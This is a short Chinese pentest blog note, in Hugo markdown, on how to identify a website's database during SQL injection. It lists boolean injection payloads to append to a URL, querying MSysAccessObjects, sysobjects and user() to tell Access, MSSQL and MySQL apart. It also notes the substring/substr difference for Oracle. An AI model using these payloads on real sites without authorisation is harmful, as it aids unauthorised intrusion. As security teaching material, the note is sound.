+++
date = "2016-06-19T22:15:52+08:00"
description = ""
draft = false
tags = ["injection"]
title = "SQL注入之判断数据库类型"
topics = ["Pentest"]

+++

### 0x01 扫描端口

### 0x02 指纹信息

### 0x03 在URL后面直接判断
> ```
Access:
    and (select count(*) from MSysAccessObjects)>0 返回正常说明是access
    and exists(select count(*) from 表)
SQLserver:
    and (select count(*) from sysobjects) >0 返回正常说明是mssql
MySQL:
    and length(user())>0    返回正常说明是MySQL
```

### 0x04 其他方法
> ```
在mssql中可以调用substring。oracle则只可调用substr
```